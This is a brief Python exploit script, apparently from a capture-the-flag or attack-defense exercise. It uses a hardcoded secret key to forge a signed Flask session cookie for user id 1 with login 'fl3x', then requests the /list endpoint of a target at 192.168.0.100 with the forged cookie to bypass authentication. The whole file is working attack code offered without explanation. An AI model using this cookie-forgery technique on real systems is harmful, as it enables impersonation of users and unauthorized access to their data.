#!/usr/bin/env python
# -*- coding: utf-8 -*-
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import requests
import sys
import re


def get_session_cookie(data, secret_key):
    """Get session with data stored in it"""
    app = Flask("sploit")
    app.secret_key = secret_key

    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

    return session_serializer.dumps(data)

ip = '192.168.0.100'

sess = get_session_cookie({ 'id': 1, 'login': 'fl3x' }, 'gk2ptgp9mB')
print(sess)

r = requests.get(f"http://{ip}/list", cookies={ 'session': sess })



